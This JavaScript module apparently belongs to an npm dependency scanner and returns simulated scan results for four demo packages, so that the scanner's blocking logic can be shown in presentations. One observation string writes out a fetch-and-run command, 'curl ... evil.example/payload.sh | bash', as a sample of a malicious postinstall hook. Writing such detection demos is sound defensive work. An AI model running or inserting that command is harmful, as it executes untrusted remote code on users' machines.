/**
 * Reproducible demo scenarios for presentations.
 * These names are NOT on npm — the backend simulates scan results so judges
 * can see blocking logic without relying on removed or unavailable packages.
 */
const DEMO_PREFIX = "demo-";

function demoResult({
  packageName,
  version,
  safe,
  severity,
  scenario,
  observations,
  fix,
  cves = [],
}) {
  return {
    package: packageName,
    version: version || "1.0.0",
    safe,
    severity,
    explanation: `[DEMO] ${scenario}`,
    observations,
    cves,
    threat: safe ? null : { attack: "demo simulation", vector: packageName },
    fix,
    demo: true,
  };
}

const SCENARIOS = {
  "demo-safe-package": (version) =>
    demoResult({
      packageName: "demo-safe-package",
      version,
      safe: true,
      severity: "none",
      scenario:
        "Clean package simulation — no suspicious install scripts, no CVEs, no malware patterns.",
      observations: ["No install hooks", "No known CVEs", "No malware patterns in source"],
      fix: null,
    }),

  "demo-block-postinstall": (version) =>
    demoResult({
      packageName: "demo-block-postinstall",
      version,
      safe: false,
      severity: "critical",
      scenario:
        "Malicious postinstall simulation — mimics a live typosquat package that runs curl during install.",
      observations: [
        "Suspicious postinstall script detected: curl, remote URL (postinstall)",
        "Script content: curl -s https://evil.example/payload.sh | bash",
      ],
      fix: "Do not install. Review install scripts before adding any dependency.",
    }),

  "demo-block-source": (version) =>
    demoResult({
      packageName: "demo-block-source",
      version,
      safe: false,
      severity: "critical",
      scenario:
        "Malicious source simulation — mimics a package still on npm whose code steals SSH keys.",
      observations: [
        "High-confidence malware patterns in 2 file(s): credential path targeting, obfuscated eval",
      ],
      fix: "Do not install. Inspect package source or use a trusted alternative.",
    }),

  "demo-block-cve": (version) =>
    demoResult({
      packageName: "demo-block-cve",
      version,
      safe: false,
      severity: "high",
      scenario:
        "Known CVE simulation — mimics blocking a package version that is still published on npm but has a high-severity vulnerability.",
      observations: ["1 known CVE(s) reported for this version"],
      fix: "Upgrade to a patched version or choose an alternative package.",
      cves: [
        {
          id: "DEMO-CVE-2024-0001",
          summary: "Remote code execution in demo-block-cve (simulated)",
          severity: "high",
        },
      ],
    }),
};

export function getDemoScanResult(packageName, version) {
  if (!packageName.startsWith(DEMO_PREFIX)) {
    return null;
  }

  const handler = SCENARIOS[packageName];
  if (!handler) {
    return demoResult({
      packageName,
      version,
      safe: false,
      severity: "high",
      scenario: `Unknown demo package "${packageName}". Use demo-safe-package, demo-block-postinstall, demo-block-source, or demo-block-cve.`,
      observations: ["Demo package name not recognized"],
      fix: "See TESTING.md for supported demo package names.",
    });
  }

  const result = handler(version);
  return result;
}

export function isDemoPackage(packageName) {
  return packageName?.startsWith(DEMO_PREFIX) ?? false;
}
